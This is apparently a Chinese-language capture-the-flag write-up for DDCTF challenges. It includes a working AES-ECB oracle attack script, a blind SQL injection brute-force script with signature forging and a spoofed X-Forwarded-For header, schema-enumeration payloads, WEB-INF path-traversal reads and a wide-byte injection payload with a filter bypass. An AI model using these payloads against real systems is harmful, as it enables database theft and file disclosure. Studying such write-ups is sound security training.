## (╯°□°）╯︵ ┻━┻
16进制转字符串 然后凯撒 256位一循环
## 第四扩展FS
图片里有个压缩包 压缩包密码是图片的备注 Pactera  解压缩得到一个file.txt 分析字频 从大到小排序得flag
## 流量分析
流量包里有 SMTP协议下有一封邮件里有image001.png dump出图片 把图片的内容转化成文本(是一串base64) 这个base64补全格式就是ssl的私钥 导入wireshark 得到flag
## 安全通信
AES_ECB 给个脚本自己体会 
```python 
from pwn import *
import string
# context.log_level = 'debug'

flag = 'fd18f4a112ca67951fc95afb92b74d8}'
for i in range(40, 100):
    r = remote('116.85.48.103', 5002)
    r.recvuntil('\n')
    r.sendline('b9ba15b341c847c8beba85273f9b7f90')
    r.recvuntil('\n')
    r.sendline('a' * i)
    enc = r.recvuntil('\n').rstrip()
    for k in string.printable:
        r.recvuntil('\n')
        r.sendline(k + flag)
        enc2 = r.recvuntil('\n').rstrip()
        if enc[-96:] == enc2:
            flag = k + flag
            print i, "[+]flag: " + str(flag)
            break
    r.close()

# 8
# 23 [+]flag: 1fc95afb92b74d8}
# 39 [+]flag: fd18f4a112ca67951fc95afb92b74d8}
# 55 [+]flag: flag is: DDCTF{afd18f4a112ca67951fc95afb92b74d8}
# Connection for mission: aaaaaaaaaaaaaaaaaaaaaaaa, your mission's flag is: DDCTF{aaaaaaaaaaaaaaaaa1fc95afb92b74d8}bbbbbbbbbbbbbbb
# Connection for mission: aaaaaaaaaaaaaaaaaaaaaaaa, your mission's flag is: DDCTF{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}
```
## 数据库的秘密
注入点是author 后台目测安全狗 签名算法控制台输入sig可以找到 比较麻烦 我直接用python popen node了
```javascript
var hexcase = 0; /* hex output format. 0 - lowercase; 1 - uppercase     */
var b64pad = ""; /* base-64 pad character. "=" for strict RFC compliance  */
var chrsz = 8; /* bits per input character. 8 - ASCII; 16 - Unicode    */
/*
 * These are the functions you'll usually want to call
 * They take string arguments and return either hex or base-64 encoded strings
 */
function hex_math_enc(s) {
 return binb2hex(core_math_enc(str2binb(s), s.length * chrsz));
}
function b64_math_enc(s) {
 return binb2b64(core_math_enc(str2binb(s), s.length * chrsz));
}
function str_math_enc(s) {
 return binb2str(core_math_enc(str2binb(s), s.length * chrsz));
}
function hex_hmac_math_enc(key, data) {
 return binb2hex(core_hmac_math_enc(key, data));
}
function b64_hmac_math_enc(key, data) {
 return binb2b64(core_hmac_math_enc(key, data));
}
function str_hmac_math_enc(key, data) {
 return binb2str(core_hmac_math_enc(key, data));
}
/*
 * Perform a simple self-test to see if the VM is working
 */
function math_enc_vm_test() {
 return hex_math_enc("abc") == "a9993e364706816aba3e25717850c26c9cd0d89d";
}
/*
 * Calculate the SHA-1 of an array of big-endian words, and a bit length
 */
function core_math_enc(x, len) {
 /* append padding */
 x[len >> 5] |= 0x80 << (24 - len % 32);
 x[((len + 64 >> 9) << 4) + 15] = len;
 var w = Array(80);
 var a = 1732584193;
 var b = -271733879;
 var c = -1732584194;
 var d = 271733878;
 var e = -1009589776;
 for (var i = 0; i < x.length; i += 16) {
  var olda = a;
  var oldb = b;
  var oldc = c;
  var oldd = d;
  var olde = e;
  for (var j = 0; j < 80; j++) {
   if (j < 16) w[j] = x[i + j];
   else w[j] = rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1);
   var t = safe_add(safe_add(rol(a, 5), math_enc_ft(j, b, c, d)), safe_add(safe_add(e, w[j]), math_enc_kt(j)));
   e = d;
   d = c;
   c = rol(b, 30);
   b = a;
   a = t;
  }
  a = safe_add(a, olda);
  b = safe_add(b, oldb);
  c = safe_add(c, oldc);
  d = safe_add(d, oldd);
  e = safe_add(e, olde);
 }
 return Array(a, b, c, d, e);
}
/*
 * Perform the appropriate triplet combination function for the current
 * iteration
 */
function math_enc_ft(t, b, c, d) {
 if (t < 20) return (b & c) | ((~b) & d);
 if (t < 40) return b ^ c ^ d;
 if (t < 60) return (b & c) | (b & d) | (c & d);
 return b ^ c ^ d;
}
/*
 * Determine the appropriate additive constant for the current iteration
 */
function math_enc_kt(t) {
 return (t < 20) ? 1518500249 : (t < 40) ? 1859775393 : (t < 60) ? -1894007588 : -899497514;
}
/*
 * Calculate the HMAC-SHA1 of a key and some data
 */
function core_hmac_math_enc(key, data) {
 var bkey = str2binb(key);
 if (bkey.length > 16) bkey = core_math_enc(bkey, key.length * chrsz);
 var ipad = Array(16),
  opad = Array(16);
 for (var i = 0; i < 16; i++) {
  ipad[i] = bkey[i] ^ 0x36363636;
  opad[i] = bkey[i] ^ 0x5C5C5C5C;
 }
 var hash = core_math_enc(ipad.concat(str2binb(data)), 512 + data.length * chrsz);
 return core_math_enc(opad.concat(hash), 512 + 160);
}
/*
 * Add integers, wrapping at 2^32. This uses 16-bit operations internally
 * to work around bugs in some JS interpreters.
 */
function safe_add(x, y) {
 var lsw = (x & 0xFFFF) + (y & 0xFFFF);
 var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
 return (msw << 16) | (lsw & 0xFFFF);
}
/*
 * Bitwise rotate a 32-bit number to the left.
 */
function rol(num, cnt) {
 return (num << cnt) | (num >>> (32 - cnt));
}
/*
 * Convert an 8-bit or 16-bit string to an array of big-endian words
 * In 8-bit function, characters >255 have their hi-byte silently ignored.
 */
function str2binb(str) {
 var bin = Array();
 var mask = (1 << chrsz) - 1;
 for (var i = 0; i < str.length * chrsz; i += chrsz)
 bin[i >> 5] |= (str.charCodeAt(i / chrsz) & mask) << (24 - i % 32);
 return bin;
}
/*
 * Convert an array of big-endian words to a string
 */
function binb2str(bin) {
 var str = "";
 var mask = (1 << chrsz) - 1;
 for (var i = 0; i < bin.length * 32; i += chrsz)
 str += String.fromCharCode((bin[i >> 5] >>> (24 - i % 32)) & mask);
 return str;
}
/*
 * Convert an array of big-endian words to a hex string.
 */
function binb2hex(binarray) {
 var hex_tab = hexcase ? "0123456789ABCDEF" : "0123456789abcdef";
 var str = "";
 for (var i = 0; i < binarray.length * 4; i++) {
  str += hex_tab.charAt((binarray[i >> 2] >> ((3 - i % 4) * 8 + 4)) & 0xF) + hex_tab.charAt((binarray[i >> 2] >> ((3 - i % 4) * 8)) & 0xF);
 }
 return str;
}
/*
 * Convert an array of big-endian words to a base-64 string
 */
function binb2b64(binarray) {
 var tab = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 var str = "";
 for (var i = 0; i < binarray.length * 4; i += 3) {
  var triplet = (((binarray[i >> 2] >> 8 * (3 - i % 4)) & 0xFF) << 16) | (((binarray[i + 1 >> 2] >> 8 * (3 - (i + 1) % 4)) & 0xFF) << 8) | ((binarray[i + 2 >> 2] >> 8 * (3 - (i + 2) % 4)) & 0xFF);
  for (var j = 0; j < 4; j++) {
   if (i * 8 + j * 6 > binarray.length * 32) str += b64pad;
   else str += tab.charAt((triplet >> 6 * (3 - j)) & 0x3F);
  }
 }
 return str;
}

var key="\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165";
function signGenerate(obj, key) {
    var str0 = '';
    for (i in obj) {
        if (i != 'sign') {
            str1 = '';
            str1 = i + '=' + obj[i];
            str0 += str1
        }
    }
    return hex_math_enc(str0 + key)
};
var obj = {
    id: '',
    title: '',
    author: process.argv[2],
    date: '',
    time: parseInt(new Date().getTime() / 1000)
    // time: "1523613720"
};

console.log(signGenerate(obj, key));
console.log(obj.time);
```
爆破脚本 自己体会
```python 
# -*- coding:utf-8 -*-
import requests
import string
import os

flag = ''
for num in range(1, 100):
    for i in string.printable:
        pay = "ad%'&&(if(ord(reverse(rpad((SELECT secvalue from ctf_key8),{},'a')))={},1,0))#".format(str(num), str(ord(i)))
        data = str(os.popen("node math.js \"{}\"".format(pay)).read()).split('\n')
        sig = data[0]
        time = data[1]

        url = "http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig={}&time={}".format(sig, time)
        header = {"X-Forwarded-For": "123.232.23.245"}
        data = {"id": "", "title": "", "date": "", "author": pay, "button": "search"}
        res = requests.post(url, data=data, headers=header)
        # print res.content
        # break
        if "admin" in res.content:
            flag += i
            print flag
            break

# database: ddctf
# payload: schema()
# tables: ctf_key8,message
# payload: SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=schema()
# columns: secvalue
# payload: SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x6374665f6b657938
# flag: DDCTF{IKIDLHNZMKFUDEQE}
# payload: SELECT secvalue from ctf_key8
# version: 5.1.73
```
## 专属链接
http://116.85.48.102:5050/image/banner/ 存在文件包含
包含 ../../WEB-INF/web.xml ../../WEB-INF/applicationContext.xml
然后根据文件内容继续包含
../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class
../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class
../../WEB-INF/classes/com/didichuxing/ctf/service/FlagService.class
../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class
从`InitListener.class`发现flag和email的加密方式
加密email 从/flag/getflag/接口得到加密后的flag
然后 通过得到的加密算法写出了解密算法
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.cert.Certificate;
import java.security.UnrecoverableKeyException;
import java.security.cert.CertificateException;
import java.util.Properties;
import java.util.UUID;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.Mac;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

public class Main {

    public static byte hexToByte(String inHex) {
        return (byte) Integer.parseInt(inHex, 16);
    }

    public static byte[] hexToByteArray(String inHex) {
        int hexlen = inHex.length();
        byte[] result;
        if (hexlen % 2 == 1) {
            //奇数
            hexlen++;
            result = new byte[(hexlen / 2)];
            inHex = "0" + inHex;
        } else {
            //偶数
            result = new byte[(hexlen / 2)];
        }
        int j = 0;
        for (int i = 0; i < hexlen; i += 2) {
            result[j] = hexToByte(inHex.substring(i, i + 2));
            j++;
        }
        return result;
    }

    public static String byte2hex(byte[] b) {
        StringBuilder hs = new StringBuilder();
        for (int n = 0; (b != null) && (n < b.length); n++) {
            String stmp = Integer.toHexString(b[n] & 0xFF);
            if (stmp.length() == 1) {
                hs.append('0');
            }
            hs.append(stmp);
        }
        return hs.toString().toUpperCase();
    }

    public static void main(String[] args) {
        try {
            String p = "sdl welcome you !".substring(0, "sdl welcome you !".length() - 1).trim().replace(" ", "");
            String flag = "506920534F89FA62C1125AABE3462F49073AB9F5C2254895534600A9242B8F18D4E420419534118D8CF9C20D07825C4797AF1A169CA83F934EF508F617C300B04242BEEA14AA4BB0F4887494703F6F50E1873708A0FE4C87AC99153DD02EEF7F9906DE120F5895DA7AD134745E032F15D253F1E4DDD6E4BC67CD0CD2314BA32660AB873B3FF067D1F3FF219C21A8B5A67246D9AE5E9437DBDD4E7FAACBA748F58FC059F662D2554AB6377D581F03E4C85BBD8D67AC6626065E2C950B9E7FBE2AEA3071DC0904455375C66A2A3F8FF4691D0C4D76347083A1E596265080FEB30816C522C6BFEA41262240A71CDBA4C02DB4AFD46C7380E2A19B08231397D099FE";

            KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());
            FileInputStream inputStream = new FileInputStream("E:\\test\\src\\sdl.ks");
            keyStore.load(inputStream, p.toCharArray());
            Key key = keyStore.getKey("www.didichuxing.com", p.toCharArray());
//            PrivateKey privateKey = (PrivateKey) keyStore.getKey("www.didichuxing.com", p.toCharArray());
            Certificate cert = keyStore.getCertificate("www.didichuxing.com");
            PublicKey publicKey = cert.getPublicKey();
            Cipher cipher = Cipher.getInstance(key.getAlgorithm());
            cipher.init(Cipher.DECRYPT_MODE, publicKey);
            byte[] data = cipher.doFinal(hexToByteArray(flag));

//            SecretKeySpec signingKey = new SecretKeySpec("sdl welcome you !".getBytes(), "HmacSHA256");
//            Mac mac = Mac.getInstance("HmacSHA256");
//            mac.init(signingKey);
//            String email = "3113936212117314317@didichuxing.com";
//            byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());

            System.out.println(byte2hex(data));
//            44444354467B313739373139333634393434313938313936317D
//            flag: DDCTF{1797193649441981961}
        } catch (KeyStoreException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (CertificateException e) {
            e.printStackTrace();
        } catch (UnrecoverableKeyException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        }

    }
}
```
## 注入的奥妙
宽字节注入 找一个big5编码最低位是5c的字符 滜(你照编码表找个其他的)
有些关键字被替换为空 但是只替换了一遍 双写绕过 但是我TM盲注了
给你个payload看下 滜%27or(if(ascii(substr((select schema()),1,1))=57,sleep(1),0))%23
可以在route_rules这张表里找到一个路径 static/bootstrap/css/backup.zip 是备份文件
大致看了一下应该就是反序列化了 但是我反序列化Test类 打过去一直是空白的

